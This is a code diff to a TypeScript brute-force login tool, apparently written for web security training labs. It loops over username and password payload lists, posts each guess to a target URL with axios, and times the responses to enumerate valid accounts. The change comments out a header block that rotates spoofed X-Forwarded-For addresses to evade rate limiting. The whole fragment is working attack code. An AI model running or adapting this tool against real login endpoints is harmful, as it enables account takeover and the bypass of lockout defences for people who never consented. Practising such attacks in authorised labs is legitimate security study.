@@ -166,7 +166,7 @@ export const bruteForceAttack = async (targetURL: string, payloadFile?: string) 
 	const extractRegex: string = (extractRegexStart + '(.*?)' + extractRegexEnd);
 	let extractedData: string = '';
 	let extractedDataCache: string = '';
-	let config: AxiosRequestConfig = undefined as any;
+	// let config: AxiosRequestConfig = undefined as any;
 
 	// if (payloadUsernames.length == payloadPasswords.length) return;
 
@@ -174,15 +174,17 @@ export const bruteForceAttack = async (targetURL: string, payloadFile?: string) 
 		const data: string = `username=${payloadUsernames[i]}&password=pass`;
 		// const data: string = `username=apps&password=${payloadPasswords[i]}`;
 		// const data: string = 'username=wiener&password=peter';
+		/*
 		config = {
 			headers: {
 				'X-Forwarded-For': `129.0.0.${payloadINT[i]}`,
 			},
 		};
+		*/
 
 		const requestStartAt: number = performance.now();
 		await axios
-			.post(targetURL, data, config)
+			.post(targetURL, data)
 			.then(response => {
 				const requestEndAt: number = performance.now();
 				const requestDuration: number = requestEndAt - requestStartAt;
